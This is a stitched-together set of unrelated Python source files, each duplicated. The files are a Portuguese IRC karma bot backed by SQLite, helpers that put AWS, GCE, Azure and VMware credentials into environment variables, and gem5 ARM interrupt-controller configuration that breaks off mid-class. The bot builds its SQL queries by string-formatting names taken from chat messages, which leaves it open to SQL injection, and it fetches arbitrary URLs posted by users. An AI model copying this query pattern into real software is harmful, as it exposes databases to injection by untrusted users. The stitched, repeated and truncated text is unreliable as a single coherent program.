			self.cursor.execute("UPDATE url SET total = total + 1 where nome = '%s';" % (nome))
			self.conn.commit()
	def insert_slack(self,nome,total):
		try:
			self.cursor.execute("INSERT INTO slack(nome,total,data) VALUES ('%s', %d, '%s' );" % (nome,total,time.strftime("%Y-%m-%d", time.localtime())))
			self.conn.commit()
			return True
		except:
			return False
	def increment_slack(self,nome,total):
		if not self.insert_slack(nome,total):
			self.cursor.execute("UPDATE slack SET total = total + %d where nome = '%s' and data = '%s' ;" % (total,nome,time.strftime("%Y-%m-%d", time.localtime())))
			self.conn.commit()
	def get_karmas_count(self):
		self.cursor.execute('SELECT nome,total FROM karma order by total desc')
		karmas = ''
		for linha in self.cursor:
			if len(karmas) == 0:
				karmas = (linha[0]) + ' = ' + str(linha[1])
			else:
				karmas = karmas + ', ' + (linha[0]) + ' = ' + str(linha[1])
		return karmas
	def get_karmas(self):
		self.cursor.execute('SELECT nome FROM karma order by total desc')
		karmas = ''
		for linha in self.cursor:
			if len(karmas) == 0:
				karmas = (linha[0])
			else:	
				karmas = karmas + ', ' + (linha[0])
		return karmas
	def get_karma(self, nome):
		self.cursor.execute("SELECT total FROM karma where nome = '%s'" % (nome))
		for linha in self.cursor:
				return (linha[0])
	def get_urls_count(self):
		self.cursor.execute('SELECT nome,total FROM url order by total desc')
		urls = ''
		for linha in self.cursor:
			if len(urls) == 0:
				urls = (linha[0]) + ' = ' + str(linha[1])
			else:
				urls = urls + ', ' + (linha[0]) + ' = ' + str(linha[1])
		return urls
	def get_slacker_count(self):
		self.cursor.execute("SELECT nome,total FROM slack where data = '%s' order by total desc" % (time.strftime("%Y-%m-%d", time.localtime())))
		slackers = ''
		for linha in self.cursor:
			if len(slackers) == 0:
				slackers = (linha[0]) + ' = ' + str(linha[1])
			else:
				slackers = slackers + ', ' + (linha[0]) + ' = ' + str(linha[1])
		return slackers


class html:
	def __init__(self, url):
		self.url = url
		self.feed = None
		self.headers = {
	      'User-Agent' : 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.10)',
   	   'Accept-Language' : 'pt-br,en-us,en',
      	'Accept-Charset' : 'utf-8,ISO-8859-1'
	   }
	def title(self):
		self.feed = self.get_data()
		title_pattern = re.compile(r"<[Tt][Ii][Tt][Ll][Ee]>(.*)</[Tt][Ii][Tt][Ll][Ee]>", re.UNICODE)
		title_search = title_pattern.search(self.feed)
		if title_search is not None:
			try:
				return "[ "+re.sub("&#?\w+;", "", title_search.group(1) )+" ]"
			except:
				print "Unexpected error:", sys.exc_info()[0]
				return "[ Fail in parse ]"
	def get_data(self):
		try:
			reqObj = urllib2.Request(self.url, None, self.headers)
			urlObj = urllib2.urlopen(reqObj)
			return  urlObj.read(4096).strip().replace("\n","")                    
		except:
			print "Unexpected error:", sys.exc_info()
			return "<title>Fail in get</title>"


banco = db('carcereiro.db')
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((server, 6667))
sock.send('NICK %s \r\n' % nick)
sock.send('USER %s \'\' \'\' :%s\r\n' % (nick, 'python'))
sock.send('JOIN %s \r\n' % channel)



while True:
	buffer = sock.recv(2040)
	if not buffer:
		break
	print buffer

	if buffer.find('PING') != -1: 
		sock.send('PONG ' + buffer.split() [1] + '\r\n')

	if re.search(':[!@]help', buffer, re.UNICODE) is not None or re.search(':'+nick+'[ ,:]+help', buffer, re.UNICODE) is not None:
		sendmsg('@karmas, @urls, @slackers\r\n')

	regexp  = re.compile('PRIVMSG.*[: ]([a-z][0-9a-z_\-\.]+)\+\+', re.UNICODE)
	regexm  = re.compile('PRIVMSG.*[: ]([a-z][0-9a-z_\-\.]+)\-\-', re.UNICODE)
	regexk  = re.compile('PRIVMSG.*:karma ([a-z_\-\.]+)', re.UNICODE)
	regexu  = re.compile('PRIVMSG.*[: ]\@urls', re.UNICODE)
	regexs  = re.compile('PRIVMSG.*[: ]\@slackers', re.UNICODE)
	regexks = re.compile('PRIVMSG.*[: ]\@karmas', re.UNICODE)
	regexslack  = re.compile(':([a-zA-Z0-9\_]+)!.* PRIVMSG.* :(.*)$', re.UNICODE)
	pattern_url   = re.compile(':([a-zA-Z0-9\_]+)!.* PRIVMSG .*(http://[áéíóúÁÉÍÓÚÀàa-zA-Z0-9_?=./,\-\+\'~]+)', re.UNICODE)
	
	resultp  = regexp.search(buffer)
	resultm  = regexm.search(buffer)
	resultk  = regexk.search(buffer)
	resultu  = regexu.search(buffer)
	results  = regexs.search(buffer)
	resultks = regexks.search(buffer)
	resultslack = regexslack.search(buffer)
	url_search = pattern_url.search(buffer)

	if resultslack is not None:
		var = len(resultslack.group(2)) - 1
		nick = resultslack.group(1)
		banco.increment_slack(nick,var)

	if resultp is not None:
		var = resultp.group(1)
		banco.increment_karma(var)
		sendmsg(var + ' now has ' + str(banco.get_karma(var)) + ' points of karma')
		continue

	if resultm is not None:
		var = resultm.group(1)
		banco.decrement_karma(var)
		sendmsg(var + ' now has ' + str(banco.get_karma(var)) + ' points of karma')
		continue

	if resultk is not None:
		var = resultk.group(1)
		points = banco.get_karma(var)
		if points is not None:
			sendmsg(var + ' have ' + str(points) + ' points of karma')
		else:
			sendmsg(var + ' doesn\'t have any point of karma')
		continue

	if resultks is not None:
		sendmsg('karmas : ' + banco.get_karmas_count())
		continue
	
	if results is not None:
		sendmsg('slackers in chars : ' + banco.get_slacker_count())
		continue

	if resultu is not None:
		sendmsg('users : ' + banco.get_urls_count())
		continue
	
	if url_search is not None:
		try:
			url  = url_search.group(2)
			nick = url_search.group(1)
			parser = html(url)
			sendmsg(  parser.title() )
			banco.increment_url( nick )
		except:
			sendmsg('[ Failed ]')
			print url
			print "Unexpected error:", sys.exc_info()[0]

sock.close()
banco.close()

#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
import socket
import sys
import urllib2
import os
import time
from pysqlite2 import dbapi2 as sqlite

channel = '#masmorra'
nick = 'carcereiro'
server = 'irc.oftc.net' 

def sendmsg(msg): 
    sock.send('PRIVMSG '+ channel + ' :' + str(msg) + '\r\n')

class db():
	def __init__(self, dbfile):
		if not os.path.exists(dbfile):
			self.conn = sqlite.connect(dbfile)
			self.cursor = self.conn.cursor()
			self.create_table()
		self.conn = sqlite.connect(dbfile)
		self.cursor = self.conn.cursor()
	def close(self):
		self.cursor.close()
		self.conn.close()
	def create_table(self):
		self.cursor.execute('CREATE TABLE karma(nome VARCHAR(30) PRIMARY KEY, total INTEGER);')
		self.cursor.execute('CREATE TABLE url(nome VARCHAR(30) PRIMARY KEY, total INTEGER);')
		self.cursor.execute('CREATE TABLE slack(nome VARCHAR(30), total INTEGER, data DATE, PRIMARY KEY (data, nome));')
		self.conn.commit()
	def insert_karma(self,nome,total):
		try:
			self.cursor.execute("INSERT INTO karma(nome,total) VALUES ('%s', %d );" % (nome,total))
			self.conn.commit()
			return True
		except:
			#print "Unexpected error:", sys.exc_info()[0]
			return False
	def increment_karma(self,nome):
		if not self.insert_karma(nome,1):
			self.cursor.execute("UPDATE karma SET total = total + 1 where nome = '%s';" % (nome))
			self.conn.commit()
	def decrement_karma(self,nome):
		if not self.insert_karma(nome,-1):
			self.cursor.execute("UPDATE karma SET total = total - 1 where nome = '%s';" % (nome))
			self.conn.commit()
	def insert_url(self,nome,total):
		try:
			self.cursor.execute("INSERT INTO url(nome,total) VALUES ('%s', %d );" % (nome,total))
			self.conn.commit()
			return True
		except:
			return False
	def increment_url(self,nome):
		if not self.insert_url(nome,1):
			self.cursor.execute("UPDATE url SET total = total + 1 where nome = '%s';" % (nome))
			self.conn.commit()
	def insert_slack(self,nome,total):
		try:
			self.cursor.execute("INSERT INTO slack(nome,total,data) VALUES ('%s', %d, '%s' );" % (nome,total,time.strftime("%Y-%m-%d", time.localtime())))
			self.conn.commit()
			return True
		except:
			return False
	def increment_slack(self,nome,total):
		if not self.insert_slack(nome,total):
			self.cursor.execute("UPDATE slack SET total = total + %d where nome = '%s' and data = '%s' ;" % (total,nome,time.strftime("%Y-%m-%d", time.localtime())))
			self.conn.commit()
	def get_karmas_count(self):
		self.cursor.execute('SELECT nome,total FROM karma order by total desc')
		karmas = ''
		for linha in self.cursor:
			if len(karmas) == 0:
				karmas = (linha[0]) + ' = ' + str(linha[1])
			else:
				karmas = karmas + ', ' + (linha[0]) + ' = ' + str(linha[1])
		return karmas
	def get_karmas(self):
		self.cursor.execute('SELECT nome FROM karma order by total desc')
		karmas = ''
		for linha in self.cursor:
			if len(karmas) == 0:
				karmas = (linha[0])
			else:	
				karmas = karmas + ', ' + (linha[0])
		return karmas
	def get_karma(self, nome):
		self.cursor.execute("SELECT total FROM karma where nome = '%s'" % (nome))
		for linha in self.cursor:
				return (linha[0])
	def get_urls_count(self):
		self.cursor.execute('SELECT nome,total FROM url order by total desc')
		urls = ''
		for linha in self.cursor:
			if len(urls) == 0:
				urls = (linha[0]) + ' = ' + str(linha[1])
			else:
				urls = urls + ', ' + (linha[0]) + ' = ' + str(linha[1])
		return urls
	def get_slacker_count(self):
		self.cursor.execute("SELECT nome,total FROM slack where data = '%s' order by total desc" % (time.strftime("%Y-%m-%d", time.localtime())))
		slackers = ''
		for linha in self.cursor:
			if len(slackers) == 0:
				slackers = (linha[0]) + ' = ' + str(linha[1])
			else:
				slackers = slackers + ', ' + (linha[0]) + ' = ' + str(linha[1])
		return slackers


class html:
	def __init__(self, url):
		self.url = url
		self.feed = None
		self.headers = {
	      'User-Agent' : 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.10)',
   	   'Accept-Language' : 'pt-br,en-us,en',
      	'Accept-Charset' : 'utf-8,ISO-8859-1'
	   }
	def title(self):
		self.feed = self.get_data()
		title_pattern = re.compile(r"<[Tt][Ii][Tt][Ll][Ee]>(.*)</[Tt][Ii][Tt][Ll][Ee]>", re.UNICODE)
		title_search = title_pattern.search(self.feed)
		if title_search is not None:
			try:
				return "[ "+re.sub("&#?\w+;", "", title_search.group(1) )+" ]"
			except:
				print "Unexpected error:", sys.exc_info()[0]
				return "[ Fail in parse ]"
	def get_data(self):
		try:
			reqObj = urllib2.Request(self.url, None, self.headers)
			urlObj = urllib2.urlopen(reqObj)
			return  urlObj.read(4096).strip().replace("\n","")                    
		except:
			print "Unexpected error:", sys.exc_info()
			return "<title>Fail in get</title>"


banco = db('carcereiro.db')
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((server, 6667))
sock.send('NICK %s \r\n' % nick)
sock.send('USER %s \'\' \'\' :%s\r\n' % (nick, 'python'))
sock.send('JOIN %s \r\n' % channel)



while True:
	buffer = sock.recv(2040)
	if not buffer:
		break
	print buffer

	if buffer.find('PING') != -1: 
		sock.send('PONG ' + buffer.split() [1] + '\r\n')

	if re.search(':[!@]help', buffer, re.UNICODE) is not None or re.search(':'+nick+'[ ,:]+help', buffer, re.UNICODE) is not None:
		sendmsg('@karmas, @urls, @slackers\r\n')

	regexp  = re.compile('PRIVMSG.*[: ]([a-z][0-9a-z_\-\.]+)\+\+', re.UNICODE)
	regexm  = re.compile('PRIVMSG.*[: ]([a-z][0-9a-z_\-\.]+)\-\-', re.UNICODE)
	regexk  = re.compile('PRIVMSG.*:karma ([a-z_\-\.]+)', re.UNICODE)
	regexu  = re.compile('PRIVMSG.*[: ]\@urls', re.UNICODE)
	regexs  = re.compile('PRIVMSG.*[: ]\@slackers', re.UNICODE)
	regexks = re.compile('PRIVMSG.*[: ]\@karmas', re.UNICODE)
	regexslack  = re.compile(':([a-zA-Z0-9\_]+)!.* PRIVMSG.* :(.*)$', re.UNICODE)
	pattern_url   = re.compile(':([a-zA-Z0-9\_]+)!.* PRIVMSG .*(http://[áéíóúÁÉÍÓÚÀàa-zA-Z0-9_?=./,\-\+\'~]+)', re.UNICODE)
	
	resultp  = regexp.search(buffer)
	resultm  = regexm.search(buffer)
	resultk  = regexk.search(buffer)
	resultu  = regexu.search(buffer)
	results  = regexs.search(buffer)
	resultks = regexks.search(buffer)
	resultslack = regexslack.search(buffer)
	url_search = pattern_url.search(buffer)

	if resultslack is not None:
		var = len(resultslack.group(2)) - 1
		nick = resultslack.group(1)
		banco.increment_slack(nick,var)

	if resultp is not None:
		var = resultp.group(1)
		banco.increment_karma(var)
		sendmsg(var + ' now has ' + str(banco.get_karma(var)) + ' points of karma')
		continue

	if resultm is not None:
		var = resultm.group(1)
		banco.decrement_karma(var)
		sendmsg(var + ' now has ' + str(banco.get_karma(var)) + ' points of karma')
		continue

	if resultk is not None:
		var = resultk.group(1)
		points = banco.get_karma(var)
		if points is not None:
			sendmsg(var + ' have ' + str(points) + ' points of karma')
		else:
			sendmsg(var + ' doesn\'t have any point of karma')
		continue

	if resultks is not None:
		sendmsg('karmas : ' + banco.get_karmas_count())
		continue
	
	if results is not None:
		sendmsg('slackers in chars : ' + banco.get_slacker_count())
		continue

	if resultu is not None:
		sendmsg('users : ' + banco.get_urls_count())
		continue
	
	if url_search is not None:
		try:
			url  = url_search.group(2)
			nick = url_search.group(1)
			parser = html(url)
			sendmsg(  parser.title() )
			banco.increment_url( nick )
		except:
			sendmsg('[ Failed ]')
			print url
			print "Unexpected error:", sys.exc_info()[0]

sock.close()
banco.close()

import json
import os
import stat
import tempfile

from django.conf import settings


def aws(cred, env, private_data_dir):
    env['AWS_ACCESS_KEY_ID'] = cred.get_input('username', default='')
    env['AWS_SECRET_ACCESS_KEY'] = cred.get_input('password', default='')

    if cred.has_input('security_token'):
        env['AWS_SECURITY_TOKEN'] = cred.get_input('security_token', default='')


def gce(cred, env, private_data_dir):
    project = cred.get_input('project', default='')
    username = cred.get_input('username', default='')

    env['GCE_EMAIL'] = username
    env['GCE_PROJECT'] = project
    json_cred = {
        'type': 'service_account',
        'private_key': cred.get_input('ssh_key_data', default=''),
        'client_email': username,
        'project_id': project                    
    }
    handle, path = tempfile.mkstemp(dir=private_data_dir)                    
    f = os.fdopen(handle, 'w')                    
    json.dump(json_cred, f)                    
    f.close()                    
    os.chmod(path, stat.S_IRUSR | stat.S_IWUSR)
    env['GCE_CREDENTIALS_FILE_PATH'] = path


def azure_rm(cred, env, private_data_dir):
    client = cred.get_input('client', default='')
    tenant = cred.get_input('tenant', default='')

    if len(client) and len(tenant):
        env['AZURE_CLIENT_ID'] = client
        env['AZURE_TENANT'] = tenant
        env['AZURE_SECRET'] = cred.get_input('secret', default='')
        env['AZURE_SUBSCRIPTION_ID'] = cred.get_input('subscription', default='')                    
    else:
        env['AZURE_SUBSCRIPTION_ID'] = cred.get_input('subscription', default='')                    
        env['AZURE_AD_USER'] = cred.get_input('username', default='')
        env['AZURE_PASSWORD'] = cred.get_input('password', default='')

    if cred.has_input('cloud_environment'):
        env['AZURE_CLOUD_ENVIRONMENT'] = cred.get_input('cloud_environment')


def vmware(cred, env, private_data_dir):
    env['VMWARE_USER'] = cred.get_input('username', default='')
    env['VMWARE_PASSWORD'] = cred.get_input('password', default='')
    env['VMWARE_HOST'] = cred.get_input('host', default='')
    env['VMWARE_VALIDATE_CERTS'] = str(settings.VMWARE_VALIDATE_CERTS)

import json
import os
import stat
import tempfile

from django.conf import settings


def aws(cred, env, private_data_dir):
    env['AWS_ACCESS_KEY_ID'] = cred.get_input('username', default='')
    env['AWS_SECRET_ACCESS_KEY'] = cred.get_input('password', default='')

    if cred.has_input('security_token'):
        env['AWS_SECURITY_TOKEN'] = cred.get_input('security_token', default='')


def gce(cred, env, private_data_dir):
    project = cred.get_input('project', default='')
    username = cred.get_input('username', default='')

    env['GCE_EMAIL'] = username
    env['GCE_PROJECT'] = project
    json_cred = {
        'type': 'service_account',
        'private_key': cred.get_input('ssh_key_data', default=''),
        'client_email': username,
        'project_id': project                    
    }
    handle, path = tempfile.mkstemp(dir=private_data_dir)                    
    f = os.fdopen(handle, 'w')                    
    json.dump(json_cred, f)                    
    f.close()                    
    os.chmod(path, stat.S_IRUSR | stat.S_IWUSR)
    env['GCE_CREDENTIALS_FILE_PATH'] = path


def azure_rm(cred, env, private_data_dir):
    client = cred.get_input('client', default='')
    tenant = cred.get_input('tenant', default='')

    if len(client) and len(tenant):
        env['AZURE_CLIENT_ID'] = client
        env['AZURE_TENANT'] = tenant
        env['AZURE_SECRET'] = cred.get_input('secret', default='')
        env['AZURE_SUBSCRIPTION_ID'] = cred.get_input('subscription', default='')                    
    else:
        env['AZURE_SUBSCRIPTION_ID'] = cred.get_input('subscription', default='')                    
        env['AZURE_AD_USER'] = cred.get_input('username', default='')
        env['AZURE_PASSWORD'] = cred.get_input('password', default='')

    if cred.has_input('cloud_environment'):
        env['AZURE_CLOUD_ENVIRONMENT'] = cred.get_input('cloud_environment')


def vmware(cred, env, private_data_dir):
    env['VMWARE_USER'] = cred.get_input('username', default='')
    env['VMWARE_PASSWORD'] = cred.get_input('password', default='')
    env['VMWARE_HOST'] = cred.get_input('host', default='')
    env['VMWARE_VALIDATE_CERTS'] = str(settings.VMWARE_VALIDATE_CERTS)

# Copyright (c) 2012-2013, 2017-2018 ARM Limited
# All rights reserved.
#
# The license below extends only to copyright in the software and shall
# not be construed as granting a license to any other intellectual
# property including but not limited to intellectual property relating
# to a hardware implementation of the functionality of the software
# licensed hereunder.  You may use the software subject to the license
# terms below provided that you ensure that this notice is replicated
# unmodified and in its entirety in all distributions of the software,
# modified or unmodified, in source code or in binary form.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are
# met: redistributions of source code must retain the above copyright
# notice, this list of conditions and the following disclaimer;
# redistributions in binary form must reproduce the above copyright
# notice, this list of conditions and the following disclaimer in the
# documentation and/or other materials provided with the distribution;
# neither the name of the copyright holders nor the names of its
# contributors may be used to endorse or promote products derived from
# this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
# A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
# OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
# SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
# LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
# DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
# THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#
# Authors: Andreas Sandberg

from m5.params import *
from m5.proxy import *
from m5.util.fdthelper import *
from m5.SimObject import SimObject

from m5.objects.Device import PioDevice                    
from m5.objects.Platform import Platform

class BaseGic(PioDevice):
    type = 'BaseGic'
    abstract = True
    cxx_header = "dev/arm/base_gic.hh"

    platform = Param.Platform(Parent.any, "Platform this device is part of.")

    gicd_iidr = Param.UInt32(0,
        "Distributor Implementer Identification Register")
    gicd_pidr = Param.UInt32(0,
        "Peripheral Identification Register")
    gicc_iidr = Param.UInt32(0,
        "CPU Interface Identification Register")
    gicv_iidr = Param.UInt32(0,
        "VM CPU Interface Identification Register")

class ArmInterruptPin(SimObject):
    type = 'ArmInterruptPin'
    cxx_header = "dev/arm/base_gic.hh"
    cxx_class = "ArmInterruptPinGen"
    abstract = True

    platform = Param.Platform(Parent.any, "Platform with interrupt controller")
    num = Param.UInt32("Interrupt number in GIC")

class ArmSPI(ArmInterruptPin):
    type = 'ArmSPI'
    cxx_header = "dev/arm/base_gic.hh"
    cxx_class = "ArmSPIGen"

class ArmPPI(ArmInterruptPin):
    type = 'ArmPPI'
    cxx_header = "dev/arm/base_gic.hh"
    cxx_class = "ArmPPIGen"

class GicV2(BaseGic):
    type = 'GicV2'
    cxx_header = "dev/arm/gic_v2.hh"

    dist_addr = Param.Addr("Address for distributor")
    cpu_addr = Param.Addr("Address for cpu")
    cpu_size = Param.Addr(0x2000, "Size of cpu register bank")
    dist_pio_delay = Param.Latency('10ns', "Delay for PIO r/w to distributor")
    cpu_pio_delay = Param.Latency('10ns', "Delay for PIO r/w to cpu interface")
    int_latency = Param.Latency('10ns', "Delay for interrupt to get to CPU")
    it_lines = Param.UInt32(128, "Number of interrupt lines supported (max = 1020)")
    gem5_extensions = Param.Bool(False, "Enable gem5 extensions")

class Gic400(GicV2):
    """
    As defined in:
    "ARM Generic Interrupt Controller Architecture" version 2.0
    "CoreLink GIC-400 Generic Interrupt Controller" revision r0p1
    """
    gicd_pidr = 0x002bb490
    gicd_iidr = 0x0200143B
    gicc_iidr = 0x0202143B

    # gicv_iidr same as gicc_idr
    gicv_iidr = gicc_iidr

class Gicv2mFrame(SimObject):
    type = 'Gicv2mFrame'
    cxx_header = "dev/arm/gic_v2m.hh"
    spi_base = Param.UInt32(0x0, "Frame SPI base number");
    spi_len = Param.UInt32(0x0, "Frame SPI total number");
    addr = Param.Addr("Address for frame PIO")

class Gicv2m(PioDevice):
    type = 'Gicv2m'
    cxx_header = "dev/arm/gic_v2m.hh"

    pio_delay = Param.Latency('10ns', "Delay for PIO r/w")
    gic = Param.BaseGic(Parent.any, "Gic on which to trigger interrupts")
    frames = VectorParam.Gicv2mFrame([], "Power of two number of frames")

class VGic(PioDevice):
    type = 'VGic'
    cxx_header = "dev/arm/vgic.hh"
    gic = Param.BaseGic(Parent.any, "Gic to use for interrupting")
    platform = Param.Platform(Parent.any, "Platform this device is part of.")
    vcpu_addr = Param.Addr(0, "Address for vcpu interfaces")
    hv_addr = Param.Addr(0, "Address for hv control")
    pio_delay = Param.Latency('10ns', "Delay for PIO r/w")
   # The number of list registers is not currently configurable at runtime.
    maint_int = Param.UInt32("HV maintenance interrupt number")

    # gicv_iidr same as gicc_idr
    gicv_iidr = Param.UInt32(Self.gic.gicc_iidr,
        "VM CPU Interface Identification Register")

    def generateDeviceTree(self, state):
        gic = self.gic.unproxy(self)

        node = FdtNode("interrupt-controller")
        node.appendCompatible(["gem5,gic", "arm,cortex-a15-gic",
                               "arm,cortex-a9-gic"])
        node.append(FdtPropertyWords("#interrupt-cells", [3]))
        node.append(FdtPropertyWords("#address-cells", [0]))
        node.append(FdtProperty("interrupt-controller"))

        regs = (
            state.addrCells(gic.dist_addr) +
            state.sizeCells(0x1000) +
            state.addrCells(gic.cpu_addr) +
            state.sizeCells(0x1000) +
            state.addrCells(self.hv_addr) +
            state.sizeCells(0x2000) +
            state.addrCells(self.vcpu_addr) +
            state.sizeCells(0x2000) )

        node.append(FdtPropertyWords("reg", regs))
        node.append(FdtPropertyWords("interrupts",
                                     [1, int(self.maint_int)-16, 0xf04]))

        node.appendPhandle(gic)

        yield node

class Gicv3(BaseGic):
    type = 'Gicv3'
    cxx_header = "dev/arm/gic_v3.hh"

    dist_addr = Param.Addr("Address for distributor")
    dist_pio_delay = Param.Latency('10ns', "Delay for PIO r/w to distributor")
    redist_addr = Param.Addr("Address for redistributors")
    redist_pio_delay = Param.Latency('10ns',
            "Delay for PIO r/w to redistributors")
    it_lines = Param.UInt32(1020,
            "Number of interrupt lines supported (max = 1020)")

    maint_int = Param.ArmInterruptPin(
        "HV maintenance interrupt."
        "ARM strongly recommends that maintenance interrupts "
        "are configured to use INTID 25 (PPI Interrupt).")

    cpu_max = Param.Unsigned(256,
        "Maximum number of PE. This is affecting the maximum number of "
        "redistributors")

    gicv4 = Param.Bool(True, "GICv4 extension available")

# Copyright (c) 2012-2013, 2017-2018 ARM Limited
# All rights reserved.
#
# The license below extends only to copyright in the software and shall
# not be construed as granting a license to any other intellectual
# property including but not limited to intellectual property relating
# to a hardware implementation of the functionality of the software
# licensed hereunder.  You may use the software subject to the license
# terms below provided that you ensure that this notice is replicated
# unmodified and in its entirety in all distributions of the software,
# modified or unmodified, in source code or in binary form.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are
# met: redistributions of source code must retain the above copyright
# notice, this list of conditions and the following disclaimer;
# redistributions in binary form must reproduce the above copyright
# notice, this list of conditions and the following disclaimer in the
# documentation and/or other materials provided with the distribution;
# neither the name of the copyright holders nor the names of its
# contributors may be used to endorse or promote products derived from
# this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
# A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
# OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
# SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
# LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
# DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
# THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#
# Authors: Andreas Sandberg

from m5.params import *
from m5.proxy import *
from m5.util.fdthelper import *
from m5.SimObject import SimObject

from m5.objects.Device import PioDevice                    
from m5.objects.Platform import Platform

class BaseGic(PioDevice):
    type = 'BaseGic'
    abstract = True
    cxx_header = "dev/arm/base_gic.hh"

    platform = Param.Platform(Parent.any, "Platform this device is part of.")

    gicd_iidr = Param.UInt32(0,
        "Distributor Implementer Identification Register")
    gicd_pidr = Param.UInt32(0,
        "Peripheral Identification Register")
    gicc_iidr = Param.UInt32(0,
        "CPU Interface Identification Register")
    gicv_iidr = Param.UInt32(0,
        "VM CPU Interface Identification Register")

class ArmInterruptPin(SimObject):
    type = 'ArmInterruptPin'
    cxx_header = "dev/arm/base_gic.hh"
    cxx_class = "ArmInterruptPinGen"
    abstract = True

    platform = Param.Platform(Parent.any, "Platform with interrupt controller")
    num = Param.UInt32("Interrupt number in GIC")

class ArmSPI(ArmInterruptPin):
    type = 'ArmSPI'
    cxx_header = "dev/arm/base_gic.hh"
    cxx_class = "ArmSPIGen"

class ArmPPI(ArmInterruptPin):
    type = 'ArmPPI'
    cxx_header = "dev/arm/base_gic.hh"
    cxx_class = "ArmPPIGen"

class GicV2(BaseGic):
    type = 'GicV2'
    cxx_header = "dev/arm/gic_v2.hh"

    dist_addr = Param.Addr("Address for distributor")
    cpu_addr = Param.Addr("Address for cpu")
    cpu_size = Param.Addr(0x2000, "Size of cpu register bank")
    dist_pio_delay = Param.Latency('10ns', "Delay for PIO r/w to distributor")
    cpu_pio_delay = Param.Latency('10ns', "Delay for PIO r/w to cpu interface")
    int_latency = Param.Latency('10ns', "Delay for interrupt to get to CPU")
    it_lines = Param.UInt32(128, "Number of interrupt lines supported (max = 1020)")
    gem5_extensions = Param.Bool(False, "Enable gem5 extensions")

class Gic400(GicV2):
    """
    As defined in:
    "ARM Generic Interrupt Controller Architecture" version 2.0
    "CoreLink GIC-400 Generic Interrupt Controller" revision r0p1
    """
    gicd_pidr = 0x002bb490
    gicd_iidr = 0x0200143B
    gicc_iidr = 0x0202143B

    # gicv_iidr same as gicc_idr
    gicv_iidr = gicc_iidr

class Gicv2mFrame(SimObject):
    type = 'Gicv2mFrame'
    cxx_header = "dev/arm/gic_v2m.hh"
    spi_base = Param.UInt32(0x0, "Frame SPI base number");
    spi_len = Param.UInt32(0x0, "Frame SPI total number");
    addr = Param.Addr("Address for frame PIO")

class Gicv2m(PioDevice):
    type = 'Gicv2m'
    cxx_header = "dev/arm/gic_v2m.hh"

    pio_delay = Param.Latency('10ns', "Delay for PIO r/w")
    gic = Param.BaseGic(Parent.any, "Gic on which to trigger interrupts")
    frames = VectorParam.Gicv2mFrame([], "Power of two number of frames")

class VGic(PioDevice):
    type = 'VGic'
    cxx_header = "dev/arm/vgic.hh"
    gic = Param.BaseGic(Parent.any, "Gic to use for interrupting")
    platform = Param.Platform(Parent.any, "Platform this device is part of.")
    vcpu_addr = Param.Addr(0, "Address for vcpu interfaces")
    hv_addr = Param.Addr(0, "Address for hv control")
    pio_delay = Param.Latency('10ns', "Delay for PIO r/w")
   # The number of list registers is not currently configurable at runtime.
    maint_int = Param.UInt32("HV maintenance interrupt number")

    # gicv_iidr same as gicc_idr
    gicv_iidr = Param.UInt32(Self.gic.gicc_iidr,
        "VM CPU Interface Identification Register")

    def generateDeviceTree(self, state):
        gic = self.gic.unproxy(self)

        node = FdtNode("interrupt-controller")
        node.appendCompatible(["gem5,gic", "arm,cortex-a15-gic",
                               "arm,cortex-a9-gic"])
        node.append(FdtPropertyWords("#interrupt-cells", [3]))
        node.append(FdtPropertyWords("#address-cells", [0]))
        node.append(FdtProperty("interrupt-controller"))

        regs = (
            state.addrCells(gic.dist_addr) +
            state.sizeCells(0x1000) +
            state.addrCells(gic.cpu_addr) +
            state.sizeCells(0x1000) +
            state.addrCells(self.hv_addr) +
            state.sizeCells(0x2000) +
            state.addrCells(self.vcpu_addr) +
            state.sizeCells(0x2000) )

        node.append(FdtPropertyWords("reg", regs))
        node.append(FdtPropertyWords("interrupts",
                                     [1, int(self.maint_int)-16, 0xf04]))

        node.appendPhandle(gic)

        yield node

class Gicv3(BaseGic):
    type = 'Gicv3'
    cxx_header = "dev/arm/gic_v3.hh"

    dist_addr = Param.Addr("Address for distributor")
